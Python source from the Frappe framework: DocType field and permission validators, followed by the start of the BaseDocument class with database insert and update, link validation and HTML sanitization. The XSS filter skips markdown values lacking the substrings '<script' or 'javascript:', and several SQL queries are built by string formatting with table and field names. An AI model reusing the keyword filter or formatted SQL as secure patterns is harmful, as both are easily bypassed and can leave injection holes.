				frappe.throw(_(""Options 'Dynamic Link' type of field must point to another Link Field with options as 'DocType'""))

	def check_illegal_default(d):
		if d.fieldtype == ""Check"" and d.default and d.default not in ('0', '1'):
			frappe.throw(_(""Default for 'Check' type of field must be either '0' or '1'""))
		if d.fieldtype == ""Select"" and d.default and (d.default not in d.options.split(""\n"")):
			frappe.throw(_(""Default for {0} must be an option"").format(d.fieldname))

	def check_precision(d):
		if d.fieldtype in (""Currency"", ""Float"", ""Percent"") and d.precision is not None and not (1 <= cint(d.precision) <= 6):
			frappe.throw(_(""Precision should be between 1 and 6""))

	def check_unique_and_text(docname, d):
		if meta.issingle:
			d.unique = 0
			d.search_index = 0

		if getattr(d, ""unique"", False):
			if d.fieldtype not in (""Data"", ""Link"", ""Read Only""):
				frappe.throw(_(""{0}: Fieldtype {1} for {2} cannot be unique"").format(docname, d.fieldtype, d.label), NonUniqueError)

			if not d.get(""__islocal""):
				try:
					has_non_unique_values = frappe.db.sql(""""""select `{fieldname}`, count(*)
						from `tab{doctype}` where ifnull({fieldname}, '') != ''
						group by `{fieldname}` having count(*) > 1 limit 1"""""".format(
						doctype=d.parent, fieldname=d.fieldname))

				except pymysql.InternalError as e:
					if e.args and e.args[0] == ER.BAD_FIELD_ERROR:
						# ignore if missing column, else raise
						# this happens in case of Custom Field
						pass
					else:
						raise

				else:
					# else of try block
					if has_non_unique_values and has_non_unique_values[0][0]:
						frappe.throw(_(""{0}: Field '{1}' cannot be set as Unique as it has non-unique values"").format(docname, d.label), NonUniqueError)

		if d.search_index and d.fieldtype in (""Text"", ""Long Text"", ""Small Text"", ""Code"", ""Text Editor""):
			frappe.throw(_(""{0}:Fieldtype {1} for {2} cannot be indexed"").format(docname, d.fieldtype, d.label), CannotIndexedError)

	def check_fold(fields):
		fold_exists = False
		for i, f in enumerate(fields):
			if f.fieldtype==""Fold"":
				if fold_exists:
					frappe.throw(_(""There can be only one Fold in a form""))
				fold_exists = True
				if i < len(fields)-1:
					nxt = fields[i+1]
					if nxt.fieldtype != ""Section Break"":
						frappe.throw(_(""Fold must come before a Section Break""))
				else:
					frappe.throw(_(""Fold can not be at the end of the form""))

	def check_search_fields(meta, fields):
		""""""Throw exception if `search_fields` don't contain valid fields.""""""
		if not meta.search_fields:
			return

		# No value fields should not be included in search field
		search_fields = [field.strip() for field in (meta.search_fields or """").split("","")]
		fieldtype_mapper = { field.fieldname: field.fieldtype \
			for field in filter(lambda field: field.fieldname in search_fields, fields) }

		for fieldname in search_fields:
			fieldname = fieldname.strip()
			if (fieldtype_mapper.get(fieldname) in no_value_fields) or \
				(fieldname not in fieldname_list):
				frappe.throw(_(""Search field {0} is not valid"").format(fieldname))

	def check_title_field(meta):
		""""""Throw exception if `title_field` isn't a valid fieldname.""""""
		if not meta.get(""title_field""):
			return

		if meta.title_field not in fieldname_list:
			frappe.throw(_(""Title field must be a valid fieldname""), InvalidFieldNameError)

		def _validate_title_field_pattern(pattern):
			if not pattern:
				return

			for fieldname in re.findall(""{(.*?)}"", pattern, re.UNICODE):
				if fieldname.startswith(""{""):
					# edge case when double curlies are used for escape
					continue

				if fieldname not in fieldname_list:
					frappe.throw(_(""{{{0}}} is not a valid fieldname pattern. It should be {{field_name}}."").format(fieldname),
						InvalidFieldNameError)

		df = meta.get(""fields"", filters={""fieldname"": meta.title_field})[0]
		if df:
			_validate_title_field_pattern(df.options)
			_validate_title_field_pattern(df.default)

	def check_image_field(meta):
		'''check image_field exists and is of type ""Attach Image""'''
		if not meta.image_field:
			return

		df = meta.get(""fields"", {""fieldname"": meta.image_field})
		if not df:
			frappe.throw(_(""Image field must be a valid fieldname""), InvalidFieldNameError)
		if df[0].fieldtype != 'Attach Image':
			frappe.throw(_(""Image field must be of type Attach Image""), InvalidFieldNameError)

	def check_is_published_field(meta):
		if not meta.is_published_field:
			return

		if meta.is_published_field not in fieldname_list:
			frappe.throw(_(""Is Published Field must be a valid fieldname""), InvalidFieldNameError)

	def check_timeline_field(meta):
		if not meta.timeline_field:
			return

		if meta.timeline_field not in fieldname_list:
			frappe.throw(_(""Timeline field must be a valid fieldname""), InvalidFieldNameError)

		df = meta.get(""fields"", {""fieldname"": meta.timeline_field})[0]
		if df.fieldtype not in (""Link"", ""Dynamic Link""):
			frappe.throw(_(""Timeline field must be a Link or Dynamic Link""), InvalidFieldNameError)

	def check_sort_field(meta):
		'''Validate that sort_field(s) is a valid field'''
		if meta.sort_field:
			sort_fields = [meta.sort_field]
			if ','  in meta.sort_field:
				sort_fields = [d.split()[0] for d in meta.sort_field.split(',')]

			for fieldname in sort_fields:
				if not fieldname in fieldname_list + list(default_fields):
					frappe.throw(_(""Sort field {0} must be a valid fieldname"").format(fieldname),
						InvalidFieldNameError)

	def check_illegal_depends_on_conditions(docfield):
		''' assignment operation should not be allowed in the depends on condition.'''
		depends_on_fields = [""depends_on"", ""collapsible_depends_on""]
		for field in depends_on_fields:
			depends_on = docfield.get(field, None)
			if depends_on and (""="" in depends_on) and \
				re.match(""""""[\w\.:_]+\s*={1}\s*[\w\.@'""]+"""""", depends_on):
				frappe.throw(_(""Invalid {0} condition"").format(frappe.unscrub(field)), frappe.ValidationError)

	def scrub_options_in_select(field):
		""""""Strip options for whitespaces""""""

		if field.fieldtype == ""Select"" and field.options is not None:
			options_list = []
			for i, option in enumerate(field.options.split(""\n"")):
				_option = option.strip()
				if i==0 or _option:
					options_list.append(_option)
			field.options = '\n'.join(options_list)

	def scrub_fetch_from(field):
		if hasattr(field, 'fetch_from') and getattr(field, 'fetch_from'):
			field.fetch_from = field.fetch_from.strip('\n').strip()

	fields = meta.get(""fields"")
	fieldname_list = [d.fieldname for d in fields]

	not_allowed_in_list_view = list(copy.copy(no_value_fields))
	not_allowed_in_list_view.append(""Attach Image"")
	if meta.istable:
		not_allowed_in_list_view.remove('Button')

	for d in fields:
		if not d.permlevel: d.permlevel = 0
		if d.fieldtype != ""Table"": d.allow_bulk_edit = 0
		if not d.fieldname:
			d.fieldname = d.fieldname.lower()

		check_illegal_characters(d.fieldname)
		check_unique_fieldname(meta.get(""name""), d.fieldname)
		check_fieldname_length(d.fieldname)
		check_illegal_mandatory(meta.get(""name""), d)
		check_link_table_options(meta.get(""name""), d)
		check_dynamic_link_options(d)
		check_hidden_and_mandatory(meta.get(""name""), d)
		check_in_list_view(d)
		check_in_global_search(d)
		check_illegal_default(d)
		check_unique_and_text(meta.get(""name""), d)
		check_illegal_depends_on_conditions(d)
		scrub_options_in_select(d)
		scrub_fetch_from(d)

	check_fold(fields)
	check_search_fields(meta, fields)
	check_title_field(meta)
	check_timeline_field(meta)
	check_is_published_field(meta)
	check_sort_field(meta)
	check_image_field(meta)

def validate_permissions_for_doctype(doctype, for_remove=False):
	""""""Validates if permissions are set correctly.""""""
	doctype = frappe.get_doc(""DocType"", doctype)
	validate_permissions(doctype, for_remove)

	# save permissions
	for perm in doctype.get(""permissions""):
		perm.db_update()

	clear_permissions_cache(doctype.name)

def clear_permissions_cache(doctype):
	frappe.clear_cache(doctype=doctype)
	delete_notification_count_for(doctype)
	for user in frappe.db.sql_list(""""""select
			distinct `tabHas Role`.parent
		from
			`tabHas Role`,
		tabDocPerm
			where tabDocPerm.parent = %s
			and tabDocPerm.role = `tabHas Role`.role"""""", doctype):
		frappe.clear_cache(user=user)

def validate_permissions(doctype, for_remove=False):
	permissions = doctype.get(""permissions"")
	if not permissions:
		frappe.msgprint(_('No Permissions Specified'), alert=True, indicator='orange')
	issingle = issubmittable = isimportable = False
	if doctype:
		issingle = cint(doctype.issingle)
		issubmittable = cint(doctype.is_submittable)
		isimportable = cint(doctype.allow_import)

	def get_txt(d):
		return _(""For {0} at level {1} in {2} in row {3}"").format(d.role, d.permlevel, d.parent, d.idx)

	def check_atleast_one_set(d):
		if not d.read and not d.write and not d.submit and not d.cancel and not d.create:
			frappe.throw(_(""{0}: No basic permissions set"").format(get_txt(d)))

	def check_double(d):
		has_similar = False
		similar_because_of = """"
		for p in permissions:
			if p.role==d.role and p.permlevel==d.permlevel and p!=d:
				if p.if_owner==d.if_owner:
					similar_because_of = _(""If Owner"")
					has_similar = True
					break

		if has_similar:
			frappe.throw(_(""{0}: Only one rule allowed with the same Role, Level and {1}"")\
				.format(get_txt(d),	similar_because_of))

	def check_level_zero_is_set(d):
		if cint(d.permlevel) > 0 and d.role != 'All':
			has_zero_perm = False
			for p in permissions:
				if p.role==d.role and (p.permlevel or 0)==0 and p!=d:
					has_zero_perm = True
					break

			if not has_zero_perm:
				frappe.throw(_(""{0}: Permission at level 0 must be set before higher levels are set"").format(get_txt(d)))

			for invalid in (""create"", ""submit"", ""cancel"", ""amend""):
				if d.get(invalid): d.set(invalid, 0)

	def check_permission_dependency(d):
		if d.cancel and not d.submit:
			frappe.throw(_(""{0}: Cannot set Cancel without Submit"").format(get_txt(d)))

		if (d.submit or d.cancel or d.amend) and not d.write:
			frappe.throw(_(""{0}: Cannot set Submit, Cancel, Amend without Write"").format(get_txt(d)))
		if d.amend and not d.write:
			frappe.throw(_(""{0}: Cannot set Amend without Cancel"").format(get_txt(d)))
		if d.get(""import"") and not d.create:
			frappe.throw(_(""{0}: Cannot set Import without Create"").format(get_txt(d)))

	def remove_rights_for_single(d):
		if not issingle:
			return

		if d.report:
			frappe.msgprint(_(""Report cannot be set for Single types""))
			d.report = 0
			d.set(""import"", 0)
			d.set(""export"", 0)

		for ptype, label in [[""set_user_permissions"", _(""Set User Permissions"")]]:
			if d.get(ptype):
				d.set(ptype, 0)
				frappe.msgprint(_(""{0} cannot be set for Single types"").format(label))

	def check_if_submittable(d):
		if d.submit and not issubmittable:
			frappe.throw(_(""{0}: Cannot set Assign Submit if not Submittable"").format(get_txt(d)))
		elif d.amend and not issubmittable:
			frappe.throw(_(""{0}: Cannot set Assign Amend if not Submittable"").format(get_txt(d)))

	def check_if_importable(d):
		if d.get(""import"") and not isimportable:
			frappe.throw(_(""{0}: Cannot set import as {1} is not importable"").format(get_txt(d), doctype))

	for d in permissions:
		if not d.permlevel:
			d.permlevel=0
		check_atleast_one_set(d)
		if not for_remove:
			check_double(d)
			check_permission_dependency(d)
			check_if_submittable(d)
			check_if_importable(d)
		check_level_zero_is_set(d)
		remove_rights_for_single(d)

def make_module_and_roles(doc, perm_fieldname=""permissions""):
	""""""Make `Module Def` and `Role` records if already not made. Called while installing.""""""
	try:
		if hasattr(doc,'restrict_to_domain') and doc.restrict_to_domain and \
			not frappe.db.exists('Domain', doc.restrict_to_domain):
			frappe.get_doc(dict(doctype='Domain', domain=doc.restrict_to_domain)).insert()

		if not frappe.db.exists(""Module Def"", doc.module):
			m = frappe.get_doc({""doctype"": ""Module Def"", ""module_name"": doc.module})
			m.app_name = frappe.local.module_app[frappe.scrub(doc.module)]
			m.flags.ignore_mandatory = m.flags.ignore_permissions = True
			m.insert()

		default_roles = [""Administrator"", ""Guest"", ""All""]
		roles = [p.role for p in doc.get(""permissions"") or []] + default_roles

		for role in list(set(roles)):
			if not frappe.db.exists(""Role"", role):
				r = frappe.get_doc(dict(doctype= ""Role"", role_name=role, desk_access=1))
				r.flags.ignore_mandatory = r.flags.ignore_permissions = True
				r.insert()
	except frappe.DoesNotExistError as e:
		pass
	except frappe.SQLError as e:
		if e.args[0]==1146:
			pass
		else:
			raise

def init_list(doctype):
	""""""Make boilerplate list views.""""""
	doc = frappe.get_meta(doctype)
	make_boilerplate(""controller_list.js"", doc)
	make_boilerplate(""controller_list.html"", doc)

def check_if_fieldname_conflicts_with_methods(doctype, fieldname):
	doc = frappe.get_doc({""doctype"": doctype})
	method_list = [method for method in dir(doc) if isinstance(method, str) and callable(getattr(doc, method))]

	if fieldname in method_list:
		frappe.throw(_(""Fieldname {0} conflicting with meta object"").format(fieldname))

def clear_linked_doctype_cache():
	frappe.cache().delete_value('linked_doctypes_without_ignore_user_permissions_enabled')
/n/n/nfrappe/model/base_document.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals
from six import iteritems, string_types
import datetime
import frappe, sys
from frappe import _
from frappe.utils import (cint, flt, now, cstr, strip_html,
	sanitize_html, sanitize_email, cast_fieldtype)
from frappe.model import default_fields
from frappe.model.naming import set_new_name
from frappe.model.utils.link_count import notify_link_count
from frappe.modules import load_doctype_module
from frappe.model import display_fieldtypes
from frappe.model.db_schema import type_map, varchar_len
from frappe.utils.password import get_decrypted_password, set_encrypted_password

_classes = {}

def get_controller(doctype):
	""""""Returns the **class** object of the given DocType.
	For `custom` type, returns `frappe.model.document.Document`.

	:param doctype: DocType name as string.""""""
	from frappe.model.document import Document
	global _classes

	if not doctype in _classes:
		module_name, custom = frappe.db.get_value(""DocType"", doctype, (""module"", ""custom""), cache=True) \
			or [""Core"", False]

		if custom:
			_class = Document
		else:
			module = load_doctype_module(doctype, module_name)
			classname = doctype.replace("" "", """").replace(""-"", """")
			if hasattr(module, classname):
				_class = getattr(module, classname)
				if issubclass(_class, BaseDocument):
					_class = getattr(module, classname)
				else:
					raise ImportError(doctype)
			else:
				raise ImportError(doctype)
		_classes[doctype] = _class

	return _classes[doctype]

class BaseDocument(object):
	ignore_in_getter = (""doctype"", ""_meta"", ""meta"", ""_table_fields"", ""_valid_columns"")

	def __init__(self, d):
		self.update(d)
		self.dont_update_if_missing = []

		if hasattr(self, ""__setup__""):
			self.__setup__()

	@property
	def meta(self):
		if not hasattr(self, ""_meta""):
			self._meta = frappe.get_meta(self.doctype)

		return self._meta

	def update(self, d):
		if ""doctype"" in d:
			self.set(""doctype"", d.get(""doctype""))

		# first set default field values of base document
		for key in default_fields:
			if key in d:
				self.set(key, d.get(key))

		for key, value in iteritems(d):
			self.set(key, value)

		return self

	def update_if_missing(self, d):
		if isinstance(d, BaseDocument):
			d = d.get_valid_dict()

		if ""doctype"" in d:
			self.set(""doctype"", d.get(""doctype""))
		for key, value in iteritems(d):
			# dont_update_if_missing is a list of fieldnames, for which, you don't want to set default value
			if (self.get(key) is None) and (value is not None) and (key not in self.dont_update_if_missing):
				self.set(key, value)

	def get_db_value(self, key):
		return frappe.db.get_value(self.doctype, self.name, key)

	def get(self, key=None, filters=None, limit=None, default=None):
		if key:
			if isinstance(key, dict):
				return _filter(self.get_all_children(), key, limit=limit)
			if filters:
				if isinstance(filters, dict):
					value = _filter(self.__dict__.get(key, []), filters, limit=limit)
				else:
					default = filters
					filters = None
					value = self.__dict__.get(key, default)
			else:
				value = self.__dict__.get(key, default)

			if value is None and key not in self.ignore_in_getter \
				and key in (d.fieldname for d in self.meta.get_table_fields()):
				self.set(key, [])
				value = self.__dict__.get(key)

			return value
		else:
			return self.__dict__

	def getone(self, key, filters=None):
		return self.get(key, filters=filters, limit=1)[0]

	def set(self, key, value, as_value=False):
		if isinstance(value, list) and not as_value:
			self.__dict__[key] = []
			self.extend(key, value)
		else:
			self.__dict__[key] = value

	def delete_key(self, key):
		if key in self.__dict__:
			del self.__dict__[key]

	def append(self, key, value=None):
		if value==None:
			value={}
		if isinstance(value, (dict, BaseDocument)):
			if not self.__dict__.get(key):
				self.__dict__[key] = []
			value = self._init_child(value, key)
			self.__dict__[key].append(value)

			# reference parent document
			value.parent_doc = self

			return value
		else:

			# metaclasses may have arbitrary lists
			# which we can ignore
			if (getattr(self, '_metaclass', None)
				or self.__class__.__name__ in ('Meta', 'FormMeta', 'DocField')):
				return value

			raise ValueError(
				'Document for field ""{0}"" attached to child table of ""{1}"" must be a dict or BaseDocument, not {2} ({3})'.format(key,
					self.name, str(type(value))[1:-1], value)
			)

	def extend(self, key, value):
		if isinstance(value, list):
			for v in value:
				self.append(key, v)
		else:
			raise ValueError

	def remove(self, doc):
		self.get(doc.parentfield).remove(doc)

	def _init_child(self, value, key):
		if not self.doctype:
			return value
		if not isinstance(value, BaseDocument):
			if ""doctype"" not in value:
				value[""doctype""] = self.get_table_field_doctype(key)
				if not value[""doctype""]:
					raise AttributeError(key)
			value = get_controller(value[""doctype""])(value)
			value.init_valid_columns()

		value.parent = self.name
		value.parenttype = self.doctype
		value.parentfield = key

		if value.docstatus is None:
			value.docstatus = 0

		if not getattr(value, ""idx"", None):
			value.idx = len(self.get(key) or []) + 1

		if not getattr(value, ""name"", None):
			value.__dict__['__islocal'] = 1

		return value

	def get_valid_dict(self, sanitize=True, convert_dates_to_str=False):
		d = frappe._dict()
		for fieldname in self.meta.get_valid_columns():
			d[fieldname] = self.get(fieldname)

			# if no need for sanitization and value is None, continue
			if not sanitize and d[fieldname] is None:
				continue

			df = self.meta.get_field(fieldname)
			if df:
				if df.fieldtype==""Check"":
					if d[fieldname]==None:
						d[fieldname] = 0

					elif (not isinstance(d[fieldname], int) or d[fieldname] > 1):
						d[fieldname] = 1 if cint(d[fieldname]) else 0

				elif df.fieldtype==""Int"" and not isinstance(d[fieldname], int):
					d[fieldname] = cint(d[fieldname])

				elif df.fieldtype in (""Currency"", ""Float"", ""Percent"") and not isinstance(d[fieldname], float):
					d[fieldname] = flt(d[fieldname])

				elif df.fieldtype in (""Datetime"", ""Date"", ""Time"") and d[fieldname]=="""":
					d[fieldname] = None

				elif df.get(""unique"") and cstr(d[fieldname]).strip()=="""":
					# unique empty field should be set to None
					d[fieldname] = None

				if isinstance(d[fieldname], list) and df.fieldtype != 'Table':
					frappe.throw(_('Value for {0} cannot be a list').format(_(df.label)))

				if convert_dates_to_str and isinstance(d[fieldname], (datetime.datetime, datetime.time, datetime.timedelta)):
					d[fieldname] = str(d[fieldname])

		return d

	def init_valid_columns(self):
		for key in default_fields:
			if key not in self.__dict__:
				self.__dict__[key] = None

			if key in (""idx"", ""docstatus"") and self.__dict__[key] is None:
				self.__dict__[key] = 0

		for key in self.get_valid_columns():
			if key not in self.__dict__:
				self.__dict__[key] = None

	def get_valid_columns(self):
		if self.doctype not in frappe.local.valid_columns:
			if self.doctype in (""DocField"", ""DocPerm"") and self.parent in (""DocType"", ""DocField"", ""DocPerm""):
				from frappe.model.meta import get_table_columns
				valid = get_table_columns(self.doctype)
			else:
				valid = self.meta.get_valid_columns()

			frappe.local.valid_columns[self.doctype] = valid

		return frappe.local.valid_columns[self.doctype]

	def is_new(self):
		return self.get(""__islocal"")

	def as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False):
		doc = self.get_valid_dict(convert_dates_to_str=convert_dates_to_str)
		doc[""doctype""] = self.doctype
		for df in self.meta.get_table_fields():
			children = self.get(df.fieldname) or []
			doc[df.fieldname] = [d.as_dict(no_nulls=no_nulls) for d in children]

		if no_nulls:
			for k in list(doc):
				if doc[k] is None:
					del doc[k]

		if no_default_fields:
			for k in list(doc):
				if k in default_fields:
					del doc[k]

		for key in (""_user_tags"", ""__islocal"", ""__onload"", ""_liked_by"", ""__run_link_triggers""):
			if self.get(key):
				doc[key] = self.get(key)

		return doc

	def as_json(self):
		return frappe.as_json(self.as_dict())

	def get_table_field_doctype(self, fieldname):
		return self.meta.get_field(fieldname).options

	def get_parentfield_of_doctype(self, doctype):
		fieldname = [df.fieldname for df in self.meta.get_table_fields() if df.options==doctype]
		return fieldname[0] if fieldname else None

	def db_insert(self):
		""""""INSERT the document (with valid columns) in the database.""""""
		if not self.name:
			# name will be set by document class in most cases
			set_new_name(self)

		if not self.creation:
			self.creation = self.modified = now()
			self.created_by = self.modifield_by = frappe.session.user

		d = self.get_valid_dict(convert_dates_to_str=True)

		columns = list(d)
		try:
			frappe.db.sql(""""""insert into `tab{doctype}`
				({columns}) values ({values})"""""".format(
					doctype = self.doctype,
					columns = "", "".join([""`""+c+""`"" for c in columns]),
					values = "", "".join([""%s""] * len(columns))
				), list(d.values()))
		except Exception as e:
			if e.args[0]==1062:
				if ""PRIMARY"" in cstr(e.args[1]):
					if self.meta.autoname==""hash"":
						# hash collision? try again
						self.name = None
						self.db_insert()
						return

					raise frappe.DuplicateEntryError(self.doctype, self.name, e)

				elif ""Duplicate"" in cstr(e.args[1]):
					# unique constraint
					self.show_unique_validation_message(e)
				else:
					raise
			else:
				raise
		self.set(""__islocal"", False)

	def db_update(self):
		if self.get(""__islocal"") or not self.name:
			self.db_insert()
			return

		d = self.get_valid_dict(convert_dates_to_str=True)

		# don't update name, as case might've been changed
		name = d['name']
		del d['name']

		columns = list(d)

		try:
			frappe.db.sql(""""""update `tab{doctype}`
				set {values} where name=%s"""""".format(
					doctype = self.doctype,
					values = "", "".join([""`""+c+""`=%s"" for c in columns])
				), list(d.values()) + [name])
		except Exception as e:
			if e.args[0]==1062 and ""Duplicate"" in cstr(e.args[1]):
				self.show_unique_validation_message(e)
			else:
				raise

	def show_unique_validation_message(self, e):
		type, value, traceback = sys.exc_info()
		fieldname, label = str(e).split(""'"")[-2], None

		# unique_first_fieldname_second_fieldname is the constraint name
		# created using frappe.db.add_unique
		if ""unique_"" in fieldname:
			fieldname = fieldname.split(""_"", 1)[1]

		df = self.meta.get_field(fieldname)
		if df:
			label = df.label

		frappe.msgprint(_(""{0} must be unique"".format(label or fieldname)))

		# this is used to preserve traceback
		raise frappe.UniqueValidationError(self.doctype, self.name, e)

	def update_modified(self):
		'''Update modified timestamp'''
		self.set(""modified"", now())
		frappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False)

	def _fix_numeric_types(self):
		for df in self.meta.get(""fields""):
			if df.fieldtype == ""Check"":
				self.set(df.fieldname, cint(self.get(df.fieldname)))

			elif self.get(df.fieldname) is not None:
				if df.fieldtype == ""Int"":
					self.set(df.fieldname, cint(self.get(df.fieldname)))

				elif df.fieldtype in (""Float"", ""Currency"", ""Percent""):
					self.set(df.fieldname, flt(self.get(df.fieldname)))

		if self.docstatus is not None:
			self.docstatus = cint(self.docstatus)

	def _get_missing_mandatory_fields(self):
		""""""Get mandatory fields that do not have any values""""""
		def get_msg(df):
			if df.fieldtype == ""Table"":
				return ""{}: {}: {}"".format(_(""Error""), _(""Data missing in table""), _(df.label))

			elif self.parentfield:
				return ""{}: {} {} #{}: {}: {}"".format(_(""Error""), frappe.bold(_(self.doctype)),
					_(""Row""), self.idx, _(""Value missing for""), _(df.label))

			else:
				return _(""Error: Value missing for {0}: {1}"").format(_(df.parent), _(df.label))

		missing = []

		for df in self.meta.get(""fields"", {""reqd"": ('=', 1)}):
			if self.get(df.fieldname) in (None, []) or not strip_html(cstr(self.get(df.fieldname))).strip():
				missing.append((df.fieldname, get_msg(df)))

		# check for missing parent and parenttype
		if self.meta.istable:
			for fieldname in (""parent"", ""parenttype""):
				if not self.get(fieldname):
					missing.append((fieldname, get_msg(frappe._dict(label=fieldname))))

		return missing

	def get_invalid_links(self, is_submittable=False):
		'''Returns list of invalid links and also updates fetch values if not set'''
		def get_msg(df, docname):
			if self.parentfield:
				return ""{} #{}: {}: {}"".format(_(""Row""), self.idx, _(df.label), docname)
			else:
				return ""{}: {}"".format(_(df.label), docname)

		invalid_links = []
		cancelled_links = []

		for df in (self.meta.get_link_fields()
				+ self.meta.get(""fields"", {""fieldtype"": ('=', ""Dynamic Link"")})):
			docname = self.get(df.fieldname)

			if docname:
				if df.fieldtype==""Link"":
					doctype = df.options
					if not doctype:
						frappe.throw(_(""Options not set for link field {0}"").format(df.fieldname))
				else:
					doctype = self.get(df.options)
					if not doctype:
						frappe.throw(_(""{0} must be set first"").format(self.meta.get_label(df.options)))

				# MySQL is case insensitive. Preserve case of the original docname in the Link Field.

				# get a map of values ot fetch along with this link query
				# that are mapped as link_fieldname.source_fieldname in Options of
				# Readonly or Data or Text type fields

				fields_to_fetch = [
					_df for _df in self.meta.get_fields_to_fetch(df.fieldname)
					if
						not _df.get('fetch_if_empty')
						or (_df.get('fetch_if_empty') and not self.get(_df.fieldname))
				]

				if not fields_to_fetch:
					# cache a single value type
					values = frappe._dict(name=frappe.db.get_value(doctype, docname,
						'name', cache=True))
				else:
					values_to_fetch = ['name'] + [_df.fetch_from.split('.')[-1]
						for _df in fields_to_fetch]

					# don't cache if fetching other values too
					values = frappe.db.get_value(doctype, docname,
						values_to_fetch, as_dict=True)

				if frappe.get_meta(doctype).issingle:
					values.name = doctype

				if values:
					setattr(self, df.fieldname, values.name)

					for _df in fields_to_fetch:
						if self.is_new() or self.docstatus != 1 or _df.allow_on_submit:
							setattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]])

					notify_link_count(doctype, docname)

					if not values.name:
						invalid_links.append((df.fieldname, docname, get_msg(df, docname)))

					elif (df.fieldname != ""amended_from""
						and (is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable
						and cint(frappe.db.get_value(doctype, docname, ""docstatus""))==2):

						cancelled_links.append((df.fieldname, docname, get_msg(df, docname)))

		return invalid_links, cancelled_links

	def _validate_selects(self):
		if frappe.flags.in_import:
			return

		for df in self.meta.get_select_fields():
			if df.fieldname==""naming_series"" or not (self.get(df.fieldname) and df.options):
				continue

			options = (df.options or """").split(""\n"")

			# if only empty options
			if not filter(None, options):
				continue

			# strip and set
			self.set(df.fieldname, cstr(self.get(df.fieldname)).strip())
			value = self.get(df.fieldname)

			if value not in options and not (frappe.flags.in_test and value.startswith(""_T-"")):
				# show an elaborate message
				prefix = _(""Row #{0}:"").format(self.idx) if self.get(""parentfield"") else """"
				label = _(self.meta.get_label(df.fieldname))
				comma_options = '"", ""'.join(_(each) for each in options)

				frappe.throw(_('{0} {1} cannot be ""{2}"". It should be one of ""{3}""').format(prefix, label,
					value, comma_options))

	def _validate_constants(self):
		if frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants:
			return

		constants = [d.fieldname for d in self.meta.get(""fields"", {""set_only_once"": ('=',1)})]
		if constants:
			values = frappe.db.get_value(self.doctype, self.name, constants, as_dict=True)

		for fieldname in constants:
			df = self.meta.get_field(fieldname)

			# This conversion to string only when fieldtype is Date
			if df.fieldtype == 'Date' or df.fieldtype == 'Datetime':
				value = str(values.get(fieldname))

			else:
				value  = values.get(fieldname)

			if self.get(fieldname) != value:
				frappe.throw(_(""Value cannot be changed for {0}"").format(self.meta.get_label(fieldname)),
					frappe.CannotChangeConstantError)

	def _validate_length(self):
		if frappe.flags.in_install:
			return

		if self.meta.issingle:
			# single doctype value type is mediumtext
			return

		column_types_to_check_length = ('varchar', 'int', 'bigint')

		for fieldname, value in iteritems(self.get_valid_dict()):
			df = self.meta.get_field(fieldname)

			if not df or df.fieldtype == 'Check':
				# skip standard fields and Check fields
				continue

			column_type = type_map[df.fieldtype][0] or None
			default_column_max_length = type_map[df.fieldtype][1] or None

			if df and df.fieldtype in type_map and column_type in column_types_to_check_length:
				max_length = cint(df.get(""length"")) or cint(default_column_max_length)

				if len(cstr(value)) > max_length:
					if self.parentfield and self.idx:
						reference = _(""{0}, Row {1}"").format(_(self.doctype), self.idx)

					else:
						reference = ""{0} {1}"".format(_(self.doctype), self.name)

					frappe.throw(_(""{0}: '{1}' ({3}) will get truncated, as max characters allowed is {2}"")\
						.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big'))

	def _validate_update_after_submit(self):
		# get the full doc with children
		db_values = frappe.get_doc(self.doctype, self.name).as_dict()

		for key in self.as_dict():
			df = self.meta.get_field(key)
			db_value = db_values.get(key)

			if df and not df.allow_on_submit and (self.get(key) or db_value):
				if df.fieldtype==""Table"":
					# just check if the table size has changed
					# individual fields will be checked in the loop for children
					self_value = len(self.get(key))
					db_value = len(db_value)

				else:
					self_value = self.get_value(key)

				if self_value != db_value:
					frappe.throw(_(""Not allowed to change {0} after submission"").format(df.label),
						frappe.UpdateAfterSubmitError)

	def _sanitize_content(self):
		""""""Sanitize HTML and Email in field values. Used to prevent XSS.

			- Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code'
		""""""
		if frappe.flags.in_install:
			return

		for fieldname, value in self.get_valid_dict().items():
			if not value or not isinstance(value, string_types):
				continue

			value = frappe.as_unicode(value)

			if (u""<"" not in value and u"">"" not in value):
				# doesn't look like html so no need
				continue

			elif ""<!-- markdown -->"" in value and not (""<script"" in value or ""javascript:"" in value):
				# should be handled separately via the markdown converter function
				continue

			df = self.meta.get_field(fieldname)
			sanitized_value = value

			if df and df.get(""fieldtype"") in (""Data"", ""Code"", ""Small Text"") and df.get(""options"")==""Email"":
				sanitized_value = sanitize_email(value)

			elif df and (df.get(""ignore_xss_filter"")
						or (df.get(""fieldtype"")==""Code"" and df.get(""options"")!=""Email"")
						or df.get(""fieldtype"") in (""Attach"", ""Attach Image"", ""Barcode"")

						# cancelled and submit but not update after submit should be ignored
						or self.docstatus==2
						or (self.docstatus==1 and not df.get(""allow_on_submit""))):
				continue

			else:
				sanitized_value = sanitize_html(value, linkify=df.fieldtype=='Text Editor')

			self.set(fieldname, sanitized_value)

	def _save_passwords(self):
		'''Save password field values in __Auth table'''
		if self.flags.ignore_save_passwords is True:
			return

		for df in self.meta.get('fields', {'fieldtype': ('=', 'Password')}):
			if self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue
			new_password = self.get(df.fieldname)
			if new_password and not self.is_dummy_password(new_password):
				# is not a dummy password like '*****'
				set_encrypted_password(self.doctype, self.name, new_password, df.fieldname)

				# set dummy password like '*****'
				self.set(df.fieldname, '*'*len(new_password))

	def get_password(self, fieldname='password', raise_exception=True):
		if self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)):
			return self.get(fieldname)

		return get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception)

	def is_dummy_password(self, pwd):
		return ''.join(set(pwd))=='*'

	def precision(self, fieldname, parentfield=None):
		""""""Returns float precision for a particular field (or get global default).

		:param fieldname: Fieldname for which precision is required.
		:param parentfield: If fieldname is in child table.""""""
		from frappe.model.meta import get_field_precision

		if parentfield and not isinstance(parentfield, string_types):
			parentfield = parentfield.parentfield

